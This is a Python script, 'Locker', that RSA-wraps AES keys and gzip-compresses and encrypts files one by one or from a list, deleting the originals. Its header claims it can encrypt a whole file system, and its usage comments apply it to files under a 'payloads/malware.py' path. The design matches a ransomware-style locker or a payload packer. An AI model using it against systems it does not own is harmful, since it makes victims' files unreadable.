#!/usr/bin/env python3

# This code implement various workflows for encryption purposes.
# It is possible to encrypt a complete file system using this script.

import os
import sys
import gzip
import shutil
import base64
import argparse
from io import BytesIO
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding

# Personal packages
from utils.colors import Colors
from RSA.encryption_rsa import rsa_generate_keys, rsa_encrypt_path
from RSA.decryption_rsa import load_private_key, load_encrypted_code, rsa_decrypt
from AES.encryption_aes import aes_generate_key, aes_encrypt_file
from AES.decryption_aes import aes_decrypt_file

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="[!] Locker - A Python-based tool for encryption operations.")
    parser.add_argument("-p",   "--path",           help="\t\tPath to file for encryption or decryption.")
    parser.add_argument("-l",   "--list",           help="\t\tPath to file with list for encryption or decryption.")
    parser.add_argument("-ag",   "--aes_gen",       help="\t\tPath to new AES key.")
    parser.add_argument("-rg",   "--rsa_gen",       help="\t\tPath to new RSA key pair.")
    
    parser.add_argument("-re",  "--rsa_encrypt",    help="\t\tPath to plain text symmetric key.")
    parser.add_argument("-rpub","--rsa_public",     help="\t\tPath to public key path for RSA encryption.")

    parser.add_argument("-rd",  "--rsa_decrypt",    help="\t\tPath to encrypted symmetric key.")
    parser.add_argument("-rpem","--rsa_private",    help="\t\tPath to private key for RSA decryption.")

    parser.add_argument("-ae",  "--aes_encrypt", action="store_true", help="\t\tFile to encrypt using AES algorithm and decrypted symmetric key.")
    parser.add_argument("-ad",  "--aes_decrypt", action="store_true", help="\t\tFile to decrypt using AES algorithm.")

    # Some execution examples
    
    # Generate new AES key
    ## sudo ./locker.py -ag AES_keys/aes_key1

    # Generate new RSA key
    ## sudo ./locker.py -rg locking             # This command generate a new RSA key pair

    # RSA algorithms
    ## sudo ./locker.py -re AES_keys/aes_key1       -rpub RSA/lock_pem.pub  # This command encrypt an AES key using RSA
    ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem      # This command decrypts an AES key using RSA

    # AES algorithms
    ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ae -p payloads/malware.py      # This command decrypts an AES key with RSA and then encrypts a file using AES
    ## sudo ./locker.py -rd AES_keys/aes_key1.enc   -rpem RSA/lock.pem -ad -p payloads/malware.py.bin  # This command decrypts and AES key with RSA and then decrypt a file using AES

    return parser.parse_args()


# Delete old path for preserving the encrypted o decrypted version
def delete_file(path):
    if os.path.exists(path):
        try:
            os.remove(path)
            print(Colors.ORANGE + f"[!] File has been deleted successfully:\t{path}" + Colors.R)
        except Exception as e:
            print(Colors.RED + f"[x] An error ocurred while removing {path}:\n{e}" + Colors.R)


# Compress a file using gzip
def compress_gzip(input_file):
    output_file = input_file + ".gz"

    with open(input_file, 'rb') as f_in:
        with gzip.open(output_file, 'wb') as f_out:
            shutil.copyfileobj(f_in, f_out)

    print(Colors.BOLD_WHITE + f"\n[!] File compresses using gzip:\n{output_file}\n" + Colors.R)
    return output_file


# Workflow for encrypting or decrypting with AES based in args
def aes_treat_file(args, symmetric_key, path, enc_path):
    
    if path and not os.path.exists(path):
        print(Colors.RED + "[x] Desired path doesn't exist in the system." + Colors.R)
        return

    ## Case for encrypting using AES and decrypted symmetric key.
    if args.aes_encrypt and path:

        # Compress the file before encryption
        path_gz = compress_gzip(path)

        # Encrypt the file using AES
        aes_encrypt_file(symmetric_key, path_gz)

        # Log which aes_key was used for encrypting the file
        log_file = os.getcwd() + "/key_logs.csv"
        with open(log_file, 'a') as file:
            file.write(f"AES,encryption,{enc_path},{path_gz}\n")

        # Delete the old paths and preserve the encrypted version
        delete_file(path)
        delete_file(path_gz)

    ## Case for decryption using AES and decrypted symmetric key. 
    elif args.aes_decrypt and path:
        
        # The return of this decryption is a bytes type object
        decrypted_content = aes_decrypt_file(symmetric_key, path)

        # Log which aes_key was used for decrypting the file
        log_file = os.getcwd() + "/key_logs.csv"
        with open(log_file, 'a') as file:
            file.write(f"AES,decryption,{enc_path},{path}\n")

        try:
            # Decompress the data if it is gzip-compressed
            with gzip.GzipFile(fileobj=BytesIO(decrypted_content)) as gz:
                decompressed_content = gz.read()
            
            # Save the decrypted file without the '.gz.bin' termination
            decrypted_file = path[:-7]
            with open(decrypted_file, 'wb') as file:
                file.write(decompressed_content)
            
            print(Colors.GREEN + f"\n[!] Decrypted result saved into:\t{decrypted_file}\n" + Colors.R)
        
        except Exception as e:
            print(Colors.RED + f"[-] Error: {e}" + Colors.R)

        # Delete the path file and preserve the decrypted version
        delete_file(path)


def main():
    # Parse command-line arguments
    args = parse_arguments()

    # Generate a new symmetric AES key
    if args.aes_gen:
        key = aes_generate_key()

        # Save new generated key to a file
        key_base64 = base64.b64encode(key).decode('utf-8')
        with open(args.aes_gen, 'w') as file:
            file.write(key_base64)
            print(Colors.GREEN + f"[!] Key created successfully and saved into:\n{args.aes_gen}" + Colors.R)

        sys.exit(0)

    # Generate a new RSA key pair
    if args.rsa_gen:
        # Use rsa_gen arguments as key pattern
        rsa_generate_keys(args.rsa_gen)

        sys.exit(0)

    # Case for RSA encryption (usually a single AES key)
    if args.rsa_encrypt and args.rsa_public:
        # Setup path variables
        args.rsa_encrypt = args.rsa_encrypt
        enc_path = args.rsa_encrypt + ".enc"
        public_key_path = args.rsa_public

        if not os.path.exists(public_key_path):
            sys.exit(0)

        # Read the public key
        with open(public_key_path, 'rb') as file:
            public_key = file.read()

        # Serialize to get the public key
        public_key = serialization.load_pem_public_key(public_key)

        # Encrypt args.rsa_encrypt using RSA
        rsa_encrypt_path(public_key, args.rsa_encrypt, enc_path)

        # Log which public key was used for encrypting AES key
        log_file = os.getcwd() + "/key_logs.csv"
        with open(log_file, 'a') as file:
            file.write(f"{public_key_path},{enc_path}\n")

        # Delete old payload path and preserve only the new enc_path
        delete_file(args.rsa_encrypt)

        # Finish the encryption of the symmetric key
        sys.exit(0)


    # Case for RSA decryption
    if args.rsa_decrypt and args.rsa_private and not args.rsa_encrypt:
        if not os.path.exists(args.rsa_decrypt) or not os.path.exists(args.rsa_private):
            print(Colors.RED + "[x] Invalid input paths for RSA decryption." + Colors.R)
            sys.exit(0)

        # Assign variables
        enc_path            = args.rsa_decrypt
        private_key_path    = args.rsa_private

        # Read the private key
        with open(private_key_path, 'rb') as file:
            private_key_pem = file.read()

        # Load the private key and encrypted file
        private_key = load_private_key(private_key_pem)
        encrypted_code = load_encrypted_code(enc_path)

        symmetric_key = rsa_decrypt(private_key, encrypted_code)

        # When -p is provided apply the workflow for a single file
        if args.path:
            aes_treat_file(args, symmetric_key, args.path, enc_path)

        # When -l is provided apply the workflow to each file in args.list
        elif args.list is not None and os.path.exists(args.list):

            with open(args.list, 'r') as file:
                for path in file:
                    # Setup each path
                    path = path.strip()
                    #path = os.path.join(os.getcwd(), path)
                    #path = os.getcwd() + "/" + path
                    #print(path)

                    # Apply workflow for a single file
                    aes_treat_file(args, symmetric_key, path, enc_path)


if __name__ == "__main__":
    main()
